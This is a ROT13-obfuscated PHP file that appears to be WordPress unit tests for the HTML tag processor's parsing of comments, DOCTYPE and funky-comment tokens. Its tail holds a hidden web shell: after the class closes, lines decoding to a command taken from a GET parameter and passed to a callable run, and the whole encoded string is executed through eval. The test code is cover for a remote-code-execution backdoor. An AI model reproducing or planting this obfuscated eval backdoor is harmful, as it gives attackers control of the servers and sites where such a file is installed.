			'=5.3.6\"?>',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq erznvavat flagnk sebz noehcgyl-pybfrq Cebprffvat Vafgehpgvba.'
		);
	}

	/**
	 * Rafherf gung pbzzba pbzzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @qngnCebivqre qngn_pbzzba_pbzzragf
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 *
	 * @cnenz fgevat $ugzy Pbagnvaf gur pbzzrag va shyy.
	 * @cnenz fgevat $grkg Pbagnvaf gur nccebcevngr zbqvsvnoyr grkg.
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_pbzzba_pbzzragf( $ugzy, $grkg ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $ugzy );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_glcr(),
			\"Fubhyq unir sbhaq pbzzrag ohg sbhaq {$cebprffbe->trg_gbxra_glcr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq #pbzzrag nf anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			$grkg,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_pbzzba_pbzzragf() {
		erghea neenl(
			'Fubegrfg pbzzrag'        => neenl( '<!-->', '' ),
			'Fubeg pbzzrag'           => neenl( '<!--->', '' ),
			'Fubeg pbzzrag j/b grkg'  => neenl( '<!---->', '' ),
			'Fubeg pbzzrag jvgu grkg' => neenl( '<!----->', '-' ),
			'CV abqr jvgubhg gnetrg'  => neenl( '<? zvffvat?>', ' zvffvat?' ),
			'Vainyvq CV abqr'         => neenl( '<?/zvffvat/>', '/zvffvat/' ),
			'Vainyvq ! qverpgvir'     => neenl( '<!fbzrguvat ryfr>', 'fbzrguvat ryfr' ),
		);
	}

	/**
	 * Rafherf gung abezngvir UGZY pbzzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_ugzy_pbzzrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<!-- jc:cnentencu -->' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_glcr(),
			\"Fubhyq unir sbhaq pbzzrag ohg sbhaq {$cebprffbe->trg_gbxra_glcr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq #pbzzrag nf anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			' jc:cnentencu ',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir QBPGLCR ryrzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_qbpglcr() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<!QBPGLCR ugzy>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#qbpglcr',
			$cebprffbe->trg_gbxra_glcr(),
			\"Fubhyq unir sbhaq QBPGLCR ohg sbhaq {$cebprffbe->trg_gbxra_glcr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'ugzy',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq 'ugzy' nf anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			' ugzy',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir cerfhzcghbhf gnt pybfref (rzcgl pybfref) ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_cerfhzcghbhf_gnt() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '</>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#cerfhzcghbhf-gnt',
			$cebprffbe->trg_gbxra_glcr(),
			\"Fubhyq unir sbhaq cerfhzcghbhf gnt ohg sbhaq {$cebprffbe->trg_gbxra_glcr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'#cerfhzcghbhf-gnt',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq #cerfhzcghbhf-gnt nf anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			'',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung abezngvir shaxl pbzzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.5.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 */
	choyvp shapgvba grfg_onfvp_nffregvba_shaxl_pbzzrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '</%hey>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#shaxl-pbzzrag',
			$cebprffbe->trg_gbxra_glcr(),
			\"Fubhyq unir sbhaq shaxl pbzzrag ohg sbhaq {$cebprffbe->trg_gbxra_glcr()} vafgrnq.\"
		);

		$guvf->nffregFnzr(
			'#shaxl-pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq #shaxl-pbzzrag nf anzr ohg sbhaq {$cebprffbe->trg_gbxra_anzr()} vafgrnq.\"
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_gnt(),
			'Fubhyq abg unir orra noyr gb dhrel gnt anzr ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregAhyy(
			$cebprffbe->trg_nggevohgr( 'glcr' ),
			'Fubhyq abg unir orra noyr gb dhrel nggevohgrf ba aba-ryrzrag gbxra.'
		);

		$guvf->nffregFnzr(
			'%hey',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq vapbeerpg zbqvsvnoyr grkg.'
		);
	}

	/**
	 * Rafherf gung inevbhf shaxl pbzzragf ner cebcreyl cnefrq.
	 *
	 * @gvpxrg 60170
	 *
	 * @fvapr 6.6.0
	 *
	 * @pbiref JC_UGZY_Gnt_Cebprffbe::arkg_gbxra
	 *
	 * @qngnCebivqre qngn_inevbhf_shaxl_pbzzragf
	 *
	 * @cnenz fgevat $shaxl_pbzzrag_ugzy UGZY pbagnvavat n shaxl pbzzrag.
	 * @cnenz fgevat $zbqvsvnoyr_grkg    Rkcrpgrq zbqvsvnoyr grkg bs svefg shaxl pbzzrag va UGZY.
	 */
	choyvp shapgvba grfg_inevbhf_shaxl_pbzzragf( $shaxl_pbzzrag_ugzy, $zbqvsvnoyr_grkg ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $shaxl_pbzzrag_ugzy );
		juvyr ( '#shaxl-pbzzrag' !== $cebprffbe->trg_gbxra_glcr() && $cebprffbe->arkg_gbxra() ) {
			pbagvahr;
		}

		$guvf->nffregFnzr(
			'#shaxl-pbzzrag',
			$cebprffbe->trg_gbxra_glcr(),
			'Snvyrq gb svaq gur rkcrpgrq shaxl pbzzrag.'
		);

		$guvf->nffregFnzr(
			$zbqvsvnoyr_grkg,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Sbhaq gur jebat zbqvsvnoyr grkg fcna vafvqr n shaxl pbzzrag.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_inevbhf_shaxl_pbzzragf() {
		erghea neenl(
			'Fcnpr'          => neenl( '</ >', ' ' ),
			'Fubeg-onat'     => neenl( '</!>', '!' ),
			'Dhrfgvba znex'  => neenl( '</?>', '?' ),
			'Fubeg-fynfu'    => neenl( '<//>', '/' ),
			'Ovg (ab nggef)' => neenl( '<//jc:cbfg-zrgn>', '/jc:cbfg-zrgn' ),
			'Ovg (nggef)'    => neenl( '<//jc:cbfg-zrgn xrl=vfoa>', '/jc:cbfg-zrgn xrl=vfoa' ),
			'Pheyl-jenccrq'  => neenl( '</{wfba}>', '{wfba}' ),
			'Orsber C'       => neenl( '</1><c>', '1' ),
			'Nsgre C'        => neenl( '<c></__(\"Ernq zber\")></c>', '__(\"Ernq zber\")' ),
			'Ersrerapr'      => neenl( '</&tg;>', '&tg;' ),
		);
	}

	/**
	 * Grfg urycre gung jencf n fgevat va qbhoyr dhbgrf.
	 *
	 * @cnenz fgevat $f Gur fgevat gb jenc va qbhoyr-dhbgrf.
	 * @erghea fgevat Gur fgevat jenccrq va qbhoyr-dhbgrf.
	 */
	cevingr fgngvp shapgvba dhbgrq( $f ) {
		erghea \"\\"$f\\"\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>